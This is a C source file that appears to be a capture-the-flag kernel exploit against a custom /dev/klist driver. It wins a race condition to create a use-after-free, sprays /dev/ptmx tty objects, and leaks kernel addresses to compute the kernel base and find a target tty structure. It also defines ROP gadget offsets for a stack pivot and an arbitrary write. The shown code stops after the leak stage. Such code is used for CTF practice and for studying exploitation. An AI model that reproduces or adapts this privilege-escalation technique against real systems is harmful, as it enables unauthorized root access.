#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/msg.h>
#include <sys/ipc.h>
#include <sys/types.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/mman.h>

#define BUFSIZE 1024

unsigned long kernel_base;

// 0xffffffff811ba404: mov qword [rax], rdx ; ret  ;  (1 found)
// 0xffffffff8103ff27: pop rdx ; ret  ;  (1 found)
// 0xffffffff81091403: pop rax ; ret  ;  (1 found)
// mov esp, 0xF6000000 ; ret  ;  (1 found)
unsigned long stack_pivot = 0xffffffff811c78ac - 0xffffffff81000000;
unsigned long pop_rax = 0xffffffff81091403-0xffffffff81000000;
unsigned long pop_rdx = 0xffffffff8103ff27-0xffffffff81000000;
unsigned long mov_rax_rdx = 0xffffffff811ba404-0xffffffff81000000;

unsigned long fake_operations[0x100/8];


int fd1, fd2;
int fd3, fd4;
int fds[0x100];
int fds2[0x100];

void open_ptmx(int* fds) {
    for (int i=0; i<0x100; i++)
        fds[i] = open("/dev/ptmx", O_NOCTTY|O_RDWR);
    for (int i=0; i<0x100; i++)
        if (fds[i] < 0)
            exit(10);
}

void close_ptmx(int* fds) {
    for (int i=0; i<0x100; i++)
        close(fds[i]);
}


struct note {
    long refcount;
    long size;
    struct note* next;
    char buf[BUFSIZE];
};
struct note fake_note;

struct msgbuf {
    long mtype;       /* message type, must be > 0 */
    char mtext[BUFSIZE-0x60];    /* message data */
};

unsigned long args[2];

int add_item(int fd, long size, char* buf) {
    args[0] = size;
    args[1] = (unsigned long)buf;
    return ioctl(fd, 0x1337, args);
}

int select_item(int fd, long idx) {
    return ioctl(fd, 0x1338, idx);
}

int remove_item(int fd, long idx) {
    return ioctl(fd, 0x1339, idx);
}

int list_head(int fd, char* buf) {
    return ioctl(fd, 0x133a, buf);
}


int race_win = 0;
int free_now = 0;
int alloc_now = 0;

void *thread(int* fd) {
    unsigned long tmp2[BUFSIZE/8];
    while (1) {
        while (!free_now);
        if (race_win)
            break;
        alloc_now = 1;
        list_head(*fd, (char*)tmp2);
        // usleep(1);
        alloc_now = 0;
    }
    return 0;
}


int main(void) {
    unsigned long tmp[BUFSIZE/8];
    unsigned long tmp2[BUFSIZE/8];
    char buf[BUFSIZE];
    pthread_t t1, t2;


    puts("open /dev/klist");
    fd1 = open("/dev/klist", O_RDWR);
    fd2 = open("/dev/klist", O_RDWR);

    memset(buf, 'A', BUFSIZE);
    add_item(fd1, BUFSIZE-0x18, buf);

    puts("attempting race condition");
    pthread_create(&t1, NULL, thread, &fd2);

    memset(buf, 0, BUFSIZE);
    while (1) {
        free_now = 1;
        while (!alloc_now);
        add_item(fd1, BUFSIZE-0x18, buf);
        free_now = 0;
        // usleep(10);
        open_ptmx(fds);
        list_head(fd1, (char*)tmp);
        if ((int)tmp[0] > 0x2) {
            for (int i=0; i<0x8; i++)
                printf("%lx\n", tmp[i]);
            race_win = 1;
            free_now = 1;
            break;
        }
        close_ptmx(fds);
        // remove_item(fd1, 0);
    }

    pthread_join( t1, NULL );
    puts("caused race condition");

    unsigned long hoge;
    select_item(fd2, 1);
    read(fd2, &hoge, 0x8);
    printf("%lx\n", hoge);
    kernel_base = hoge - 0x101c9ca;
    printf("kernel_base = %lx\n", kernel_base);

    memset(buf, 'C', BUFSIZE);
    add_item(fd1, BUFSIZE-0x18, buf);
    list_head(fd1, (char*)tmp);
    printf("target_tty  = %lx\n", tmp[2]);
    unsigned long target_tty = tmp[2];

    return 0;
}
